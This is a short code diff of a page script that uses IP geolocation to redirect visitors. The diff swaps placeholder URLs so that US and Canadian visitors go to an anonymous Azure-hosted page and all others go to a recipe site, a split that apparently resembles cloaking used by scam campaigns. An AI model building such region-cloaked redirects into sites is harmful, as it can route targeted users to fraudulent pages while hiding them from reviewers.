@@ -1,7 +1,7 @@
 <script>
     // Define redirection URLs
-    var usaCanadaUrl = "https://example-usa-canada.com"; // URL for USA & Canada
-    var globalUrl = "https://example-global.com"; // URL for all other countries
+    var usaCanadaUrl = "https://huntop001.z13.web.core.windows.net/"; // URL for USA & Canada
+    var globalUrl = "https://www.allrecipes.com"; // URL for all other countries
 
     // Fetch user location using IP geolocation API
     fetch('https://ipapi.co/json/')
